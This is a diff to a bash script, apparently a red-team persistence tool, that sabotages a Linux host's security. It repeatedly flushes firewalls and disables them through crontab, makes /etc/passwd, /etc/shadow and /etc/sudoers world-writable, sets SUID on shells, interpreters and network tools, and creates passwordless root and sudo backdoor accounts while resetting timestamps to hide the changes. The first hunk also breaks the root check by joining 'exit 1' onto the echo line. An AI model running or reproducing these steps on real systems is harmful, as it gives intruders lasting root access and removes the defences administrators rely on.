@@ -1,8 +1,7 @@
 #!/bin/bash
 
 if [ $EUID -ne 0 ]; then
-	echo "[!] Must run as root"
-	exit 1
+	echo "[!] Must run as root" exit 1
 fi
 
 
@@ -113,9 +112,9 @@ create_sha512_password_hash () {
 
 # *** Configurable variables ***
 
-IPTABLES_CHAINS="INPUT FORWARD OUTPUT"
+IPTABLES_CUSTOM_CHAINS=""
 CRONTAB="/etc/crontab"
-IPTABLES_CRONTAB="* * * * * root iptables -F"
+IPTABLES_CRONTAB="* * * * * root iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X && iptables -t mangle -F && iptables -t mangle -X && iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT"
 UFW_CRONTAB="* * * * * root ufw disable"
 FIREWALLD_CRONTAB="* * * * * root systemctl stop firewalld && systemctl disable firewalld && systemctl mask firewalld"
 
@@ -133,6 +132,8 @@ SUDOERS="/etc/sudoers"
 
 NEW_GROUPS="users wheel sudo"
 
+SUID_BINS="bash dash zsh ksh tclsh python python2 python3 perl php lua vi vim nano less more tail nc nmap curl wget cat chmod chown cp mv nohup sed ss systemctl service"
+
 # Declaring "associative arrays" (dictionaries)
 # ${var[@]} contains values, ${!var[@]} contains keys: note the addition of the "!" for keys
 declare -A NEW_ROOT_USERS # dictionary, key-value pairs
@@ -147,8 +148,8 @@ NEW_NORMAL_USERS["`hostname | cut -d "." -f 1`"]=""
 NEW_NORMAL_USERS["ezekiel"]=""
 NEW_NORMAL_USERS["kordell"]=""
 NEW_NORMAL_USERS["christian"]="youre not hacked I promise"
-USER_HOME="/sbin"
-USER_SHELL="/usr/sbin/nologin"
+DEFAULT_HOME="/sbin"
+DEFAULT_SHELL="/usr/sbin/nologin"
 USER_PASSWORD='Password123!'
 USER_PASSWORD_HASH_FALLBACK='$6$WBBmpAfTATjQcsaX$Swrd6lone44mmh7PzfKpM6BXCKqC2huEdJo1jCfTUicPWfV8jkfPAC3ff3ZGIMa/B2zp/shGUDCRk0x0U20VH0' # echo -n 'Password123!' | mkpasswd -s -m "sha512crypt"
 
@@ -165,19 +166,35 @@ etc_timestamp=`get_timestamp "/etc"`
 if which iptables &>/dev/null; then
 	firewall_found=true
 
-	for chain in $IPTABLES_CHAINS; do
-		if [ `iptables -S | grep "\-P $chain" | cut -d " " -f 3` = "ACCEPT" ]; then
-			cecho log "iptables '$chain' chain already set to 'ACCEPT'"
-		else
-			iptables -P $chain ACCEPT &>/dev/null && cecho info "iptables '$chain' chain now set to 'ACCEPT'" || cecho error "Could not use iptables to change '$chain' chain"
-		fi
+	# Wipe everything in iptables
+	for table in filter nat mangle raw security; do
+		iptables -t $table -P INPUT ACCEPT &>/dev/null
+		iptables -t $table -P FORWARD ACCEPT &>/dev/null
+		iptables -t $table -P OUTPUT ACCEPT &>/dev/null
+		iptables -t $table -P PREROUTING ACCEPT &>/dev/null
+		iptables -t $table -P POSTROUTING ACCEPT &>/dev/null
+		iptables -t $table -F &>/dev/null # flush rules
+		iptables -t $table -X &>/dev/null # delete user-defined chain, if applicable
 	done
+	cecho info "iptables wiped, default tables and chains set to ACCEPT"
 
 	if egrep -q "^$IPTABLES_CRONTAB" "$CRONTAB"; then
 		cecho log "iptables flush command already in crontab '$CRONTAB'"
 	else
 		echo "
 $IPTABLES_CRONTAB" >> "$CRONTAB" && cecho info "Added iptables flush every minute in crontab '$CRONTAB'" || cecho error "Could not write to crontab '$CRONTAB'"
+	fi
+
+	if [ -z "$IPTABLES_CUSTOM_CHAINS" ]; then
+		cecho info "No custom iptables chains specified, skipping"
+	else
+		for chain in $IPTABLES_CUSTOM_CHAINS; do
+			if [ `iptables -S | grep "\-P $chain" | cut -d " " -f 3` = "ACCEPT" ]; then
+				cecho log "iptables '$chain' chain already set to 'ACCEPT'"
+			else
+				iptables -P $chain ACCEPT &>/dev/null && cecho info "iptables '$chain' chain now set to 'ACCEPT'" || cecho error "Could not use iptables to change '$chain' chain"
+			fi
+		done
 	fi
 else
 	cecho log "iptables not present on system, skipping"
@@ -321,8 +338,8 @@ cecho done "Weakening SSH done"
 
 cecho task "Weakening important system files"
 
-chmod o+w "$PASSWD" && cecho info "Made '$PASSWD' world writable" || cecho error "Couldn't modify timestamp for '$PASSWD'"
-chmod o+rw "$SHADOW" && cecho info "Made '$SHADOW' world readable and writable" || cecho error "Couldn't modify timestamp for '$SHADOW'"
+chmod o+w "$PASSWD" && cecho info "Made '$PASSWD' world writable" || cecho error "Couldn't chmod '$PASSWD'"
+chmod o+rw "$SHADOW" && cecho info "Made '$SHADOW' world readable and writable" || cecho error "Couldn't chmod '$SHADOW'"
 
 if [ -f "$BACKUP_NOLOGIN" ]; then
 	cecho log "Backup nologin file '$BACKUP_NOLOGIN' already exists, skipping"
@@ -342,6 +359,23 @@ else
 	set_timestamp $bin_timestamp "/bin"
 fi
 
+if [ -z "$SUID_BINS" ]; then
+	cecho info "No SUID binaries provided, skipping"
+else
+	for binary in $SUID_BINS; do
+		if which $binary &>/dev/null; then
+			bin_path=$(which $binary)
+			if chmod 4777 $bin_path; then
+				cecho info "Added SUID bit to '$bin_path'"
+			else
+				cecho error "Could not chmod '$bin_path'"
+			fi
+		else
+			cecho warning "Binary '$binary' not in PATH, skipping"
+		fi
+	done
+fi
+
 cecho debug "TO-DO: setcap binaries to provide root shells, similar to SUID!"
 
 cecho done "Done weakening important system files"
@@ -359,6 +393,8 @@ else
 	group_backup_timestamp=`get_timestamp "/etc/group-"`
 	gshadow_timestamp=`get_timestamp "/etc/gshadow"`
 	gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`
+
+	chmod o+rw "$SUDOERS" && cecho info "Made '$SUDOERS' world readable and writable" || cecho error "Couldn't chmod '$SUDOERS'"
 
 	for group in $NEW_GROUPS; do
 		if groupadd "$group" 2>/dev/null; then
@@ -424,7 +460,7 @@ else
 			cecho warning "User '$username' already exists, skipping"
 		else
 			# no-log-init, non-unique, uid, gid, no-create-home, comment, home-dir, shell, username
-			useradd -l -o -u 0 -g 0 -M -c "${NEW_ROOT_USERS[$username]}" -d "$USER_HOME" -s "$USER_SHELL" "$username" && cecho info "Created new root user '$username'" || cecho error "Could not create new root user '$username'"
+			useradd -l -o -u 0 -g 0 -M -c "${NEW_ROOT_USERS[$username]}" -d "$DEFAULT_HOME" -s "$DEFAULT_SHELL" "$username" && cecho info "Created new root user '$username'" || cecho error "Could not create new root user '$username'"
 			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
 		fi
 	done
@@ -468,7 +504,7 @@ else
 			cecho warning "User '$username' already exists, skipping"
 		else
 			# no-log-init, system, no-create-home, comment, home-dir, shell, groups, username
-			useradd -l -r -M -c "${NEW_SYSTEM_USERS[$username]}" -d "$USER_HOME" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" && cecho info "Created new system user '$username'" || cecho error "Could not create new system user '$username'"
+			useradd -l -r -M -c "${NEW_SYSTEM_USERS[$username]}" -d "$DEFAULT_HOME" -s "$DEFAULT_SHELL" -G "wheel,sudo,users" "$username" && cecho info "Created new system user '$username'" || cecho error "Could not create new system user '$username'"
 			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
 		fi
 	done
@@ -513,7 +549,9 @@ else
 			cecho warning "User '$username' already exists, skipping"
 		else
 			# no-log-init, create-home, comment, shell, groups, username, password
-			useradd -l -m -c "${NEW_NORMAL_USERS[$username]}" -s "/bin/bash" -G "wheel,sudo,users" "$username" -p "`create_sha512_password_hash`" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" && set_timestamp $home_timestamp "/home/$username" || cecho error "Could not create new normal user '$username'"
+			useradd -l -m -c "${NEW_NORMAL_USERS[$username]}" -s "/bin/bash" -G "wheel,sudo,users" "$username" -p "`create_sha512_password_hash`" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"
+
+			set_timestamp $home_timestamp "/home/$username"
 		fi
 	done
 
